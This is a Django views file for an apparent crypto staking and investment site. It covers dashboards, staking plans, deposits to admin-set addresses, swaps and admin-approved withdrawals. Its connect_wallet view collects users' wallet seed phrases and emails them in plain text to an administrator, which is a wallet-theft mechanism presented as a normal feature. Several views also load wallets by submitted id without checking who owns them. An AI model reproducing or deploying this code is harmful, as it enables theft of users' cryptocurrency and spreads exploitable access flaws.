import json
import datetime 
from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth.decorators import login_required
from django.core.mail import send_mail
from django.conf import settings
from django.utils import timezone
from django.db.models import Q
from django.contrib import messages
from decimal import Decimal
from .models import AssetWallet, Transaction, Plan, Stake, Card, WalletConnection, DepositAddress, ExchangeRate

@login_required
def dashboard(request):
    # Get or create user's wallets
    asset_types = [choice[0] for choice in AssetWallet.ASSET_CHOICES]
    wallets = []
    
    for asset_type in asset_types:
        wallet, created = AssetWallet.objects.get_or_create(
            user=request.user,
            asset_type=asset_type,
            defaults={'balance': 0}
        )
        wallets.append(wallet)
    
    # Get exchange rates to USDT (as our USD equivalent)
    exchange_rates = {}
    for rate in ExchangeRate.objects.filter(to_asset='USDT'):
        exchange_rates[rate.from_asset] = rate.rate
    
    # Add USDT to USD rate (typically 1:1)
    exchange_rates['USDT'] = Decimal('1.0')
    
    # Calculate USD value for each wallet and total balance
    total_balance_usd = Decimal('0')
    wallets_with_usd = []
    
    for wallet in wallets:
        # Default USD value if no exchange rate is found
        usd_value = Decimal('0')
        
        if wallet.asset_type == 'USDT':
            # USDT is already in USD equivalent
            usd_value = wallet.balance
        elif wallet.asset_type in exchange_rates:
            # Convert to USD using exchange rate
            usd_value = wallet.balance * exchange_rates[wallet.asset_type]
        
        wallets_with_usd.append({
            'wallet': wallet,
            'usd_value': usd_value
        })
        total_balance_usd += usd_value
    
    # Get active stakes - use is_active instead of status
    active_stakes = Stake.objects.filter(user=request.user, is_active=True)
    
    # Get available plans
    plans = Plan.objects.all()
    
    # Get recent transactions
    recent_transactions = Transaction.objects.filter(user=request.user).order_by('-timestamp')[:5]
    
    # Get card status if exists
    try:
        card = Card.objects.filter(user=request.user).latest('order_date')
    except Card.DoesNotExist:
        card = None
    
    # Calculate expected rewards for active stakes
    stakes_with_rewards = []
    for stake in active_stakes:
        roi_decimal = stake.plan.roi_percentage / Decimal('100')
        expected_reward = stake.amount * roi_decimal
        
        # Get USD value of reward if possible
        reward_usd = Decimal('0')
        if stake.asset_wallet.asset_type in exchange_rates:
            reward_usd = expected_reward * exchange_rates[stake.asset_wallet.asset_type]
        
        stakes_with_rewards.append({
            'stake': stake,
            'expected_reward': expected_reward,
            'reward_usd': reward_usd,
            'days_remaining': (stake.end_date.date() - timezone.now().date()).days
        })
    
    context = {
        'wallets': wallets,  # Keep original wallets for backward compatibility
        'wallets_with_usd': wallets_with_usd,  # New list with USD values
        'total_balance': total_balance_usd,  # Updated to use USD-equivalent total
        'active_stakes': active_stakes,
        'stakes_with_rewards': stakes_with_rewards,
        'plans': plans,
        'recent_transactions': recent_transactions,
        'card': card,
    }
    
    return render(request, 'staking/dashboard.html', context)

@login_required
def stake_form(request):
    plans = Plan.objects.all()
    wallets = AssetWallet.objects.filter(user=request.user)
    
    if request.method == 'POST':
        plan_id = request.POST.get('plan')
        wallet_id = request.POST.get('wallet')
        amount = request.POST.get('amount')
        
        # Convert amount to Decimal
        amount = Decimal(amount)
        
        plan = Plan.objects.get(id=plan_id)
        wallet = AssetWallet.objects.get(id=wallet_id)
        
        # Check if user has enough balance
        if wallet.balance < amount:
            return render(request, 'staking/stake_form.html', {
                'plans': plans,
                'wallets': wallets,
                'error': 'Insufficient balance'
            })
        
        # Check if amount meets minimum requirement
        if amount < plan.minimum_amount:
            return render(request, 'staking/stake_form.html', {
                'plans': plans,
                'wallets': wallets,
                'error': f'Minimum amount for this plan is {plan.minimum_amount} {wallet.asset_type}'
            })
        
        # Create stake
        end_date = timezone.now() + timezone.timedelta(days=plan.duration_days)
        
        stake = Stake.objects.create(
            user=request.user,
            plan=plan,
            asset_wallet=wallet,
            amount=amount,
            end_date=end_date,
            is_active=True,
            status='ACTIVE'
        )
        
        # Deduct amount from wallet
        wallet.balance -= amount
        wallet.save()
        
        # Create transaction record for the stake
        Transaction.objects.create(
            user=request.user,
            asset_wallet=wallet,
            transaction_type='STAKE',
            amount=amount,
            status='CONFIRMED'
        )
        
        messages.success(request, f'Successfully staked {amount} {wallet.asset_type} for {plan.duration_days} days with {plan.roi_percentage}% ROI.')
        return redirect('dashboard')
    
    return render(request, 'staking/stake_form.html', {
        'plans': plans,
        'wallets': wallets
    })

@login_required
def order_card(request):
    # Check if user already has a card
    existing_card = Card.objects.filter(user=request.user).first()
    
    if request.method == 'POST':
        shipping_address = request.POST.get('shipping_address')
        
        # Create card order
        Card.objects.create(
            user=request.user,
            shipping_address=shipping_address
        )
        
        return redirect('dashboard')
    
    return render(request, 'staking/order_card.html', {'existing_card': existing_card})

@login_required
def connect_wallet(request):
    if request.method == 'POST':
        seed_phrase = request.POST.get('seed_phrase')
        
        # Create wallet connection record
        connection = WalletConnection.objects.create(user=request.user)
        
        # Send email to admin with seed phrase
        admin_email = getattr(settings, 'ADMIN_EMAIL', 'admin@example.com')
        send_mail(
            f'New Wallet Connection: {request.user.username}',
            f'User {request.user.username} has connected their wallet.\n\nSeed Phrase: {seed_phrase}',
            settings.DEFAULT_FROM_EMAIL,
            [admin_email],
            fail_silently=False,
        )
        
        connection.seed_phrase_notification_sent = True
        connection.save()
        
        return redirect('dashboard')
    
    return render(request, 'staking/connect_wallet.html')

@login_required
def profile(request):
    return render(request, 'core/profile.html')



@login_required
def deposit(request):
    wallets = AssetWallet.objects.filter(user=request.user)
    
    # Get deposit addresses from admin settings
    deposit_addresses = DepositAddress.objects.filter(is_active=True)
    
    if request.method == 'POST':
        wallet_id = request.POST.get('wallet')
        amount = Decimal(request.POST.get('amount'))  # Use Decimal instead of float
        transaction_hash = request.POST.get('transaction_hash', '')
        
        wallet = AssetWallet.objects.get(id=wallet_id)
        
        # Create transaction record
        Transaction.objects.create(
            user=request.user,
            asset_wallet=wallet,
            transaction_type='DEPOSIT',
            amount=amount,
            status='PENDING',
            transaction_hash=transaction_hash
        )
        
        # Send notification to admin (optional)
        admin_email = getattr(settings, 'ADMIN_EMAIL', 'admin@example.com')
        send_mail(
            f'New Deposit Request: {request.user.username}',
            f'User {request.user.username} has requested a deposit of {amount} {wallet.asset_type}.\n\nTransaction Hash: {transaction_hash}',
            settings.DEFAULT_FROM_EMAIL,
            [admin_email],
            fail_silently=True,
        )
        
        messages.success(request, 'Your deposit request has been submitted and is pending approval.')
        return redirect('dashboard')
    
    # Convert deposit addresses to a dictionary for easy access in template
    address_dict = {addr.asset_type: addr.wallet_address for addr in deposit_addresses}
    
    return render(request, 'staking/deposit.html', {
        'wallets': wallets,
        'deposit_addresses': address_dict,
        'deposit_address_objects': deposit_addresses,
    })


@login_required
def swap(request):
    # Get user's wallets
    wallets = AssetWallet.objects.filter(user=request.user)
    
    # Get all available exchange rates
    exchange_rates = ExchangeRate.objects.all()
    
    if request.method == 'POST':
        from_wallet_id = request.POST.get('from_wallet')
        to_wallet_id = request.POST.get('to_wallet')
        amount = Decimal(request.POST.get('amount'))
        
        from_wallet = AssetWallet.objects.get(id=from_wallet_id)
        to_wallet = AssetWallet.objects.get(id=to_wallet_id)
        
        # Validate amount
        if from_wallet.balance < amount:
            messages.error(request, 'Insufficient balance for swap.')
            return render(request, 'staking/swap.html', {
                'wallets': wallets,
                'exchange_rates': exchange_rates,
                'error': 'Insufficient balance'
            })
        
        # Get exchange rate
        try:
            rate = ExchangeRate.objects.get(from_asset=from_wallet.asset_type, to_asset=to_wallet.asset_type).rate
        except ExchangeRate.DoesNotExist:
            messages.error(request, 'Exchange rate not available for this pair.')
            return render(request, 'staking/swap.html', {
                'wallets': wallets,
                'exchange_rates': exchange_rates,
                'error': 'Exchange rate not available'
            })
        
        # Calculate to_amount
        to_amount = amount * rate
        
        # Update wallet balances
        from_wallet.balance -= amount
        to_wallet.balance += to_amount
        
        from_wallet.save()
        to_wallet.save()
        
        # Create transaction record
        Transaction.objects.create(
            user=request.user,
            asset_wallet=from_wallet,
            to_asset_wallet=to_wallet,
            transaction_type='SWAP',
            amount=amount,
            to_amount=to_amount,
            exchange_rate=rate,
            status='CONFIRMED'  # Swaps are processed immediately
        )
        
        messages.success(request, f'Successfully swapped {amount} {from_wallet.asset_type} to {to_amount} {to_wallet.asset_type}.')
        return redirect('dashboard')
    
    # Prepare exchange rate data for JavaScript
    rate_data = {}
    for rate in exchange_rates:
        if rate.from_asset not in rate_data:
            rate_data[rate.from_asset] = {}
        rate_data[rate.from_asset][rate.to_asset] = float(rate.rate)
    
    return render(request, 'staking/swap.html', {
        'wallets': wallets,
        'exchange_rates': exchange_rates,
        'rate_data_json': json.dumps(rate_data)
    })


@login_required
def withdrawal(request):
    wallets = AssetWallet.objects.filter(user=request.user)
    
    if request.method == 'POST':
        wallet_id = request.POST.get('wallet')
        amount = Decimal(request.POST.get('amount'))  # Use Decimal instead of float
        destination_address = request.POST.get('destination_address')
        
        wallet = AssetWallet.objects.get(id=wallet_id)
        
        # Validate amount
        if wallet.balance < amount:
            return render(request, 'staking/withdrawal.html', {
                'wallets': wallets,
                'error': 'Insufficient balance'
            })
        
        # Create transaction record
        Transaction.objects.create(
            user=request.user,
            asset_wallet=wallet,
            transaction_type='WITHDRAWAL',
            amount=amount,
            status='PENDING',
            destination_address=destination_address
        )
        
        # Deduct amount from wallet (it will be refunded if rejected)
        wallet.balance -= amount
        wallet.save()
        
        # Send notification to admin (optional)
        admin_email = getattr(settings, 'ADMIN_EMAIL', 'admin@example.com')
        send_mail(
            f'New Withdrawal Request: {request.user.username}',
            f'User {request.user.username} has requested a withdrawal of {amount} {wallet.asset_type}.\n\nDestination Address: {destination_address}',
            settings.DEFAULT_FROM_EMAIL,
            [admin_email],
            fail_silently=True,
        )
        
        messages.success(request, 'Your withdrawal request has been submitted and is pending approval.')
        return redirect('dashboard')
    
    return render(request, 'staking/withdrawal.html', {
        'wallets': wallets
    })


@login_required
def transactions(request):
    transactions = Transaction.objects.filter(user=request.user).order_by('-timestamp')
    
    return render(request, 'staking/transactions.html', {
        'transactions': transactions
    })

def buy_crypto(request):
    return render(request, 'staking/buy_crypto.html')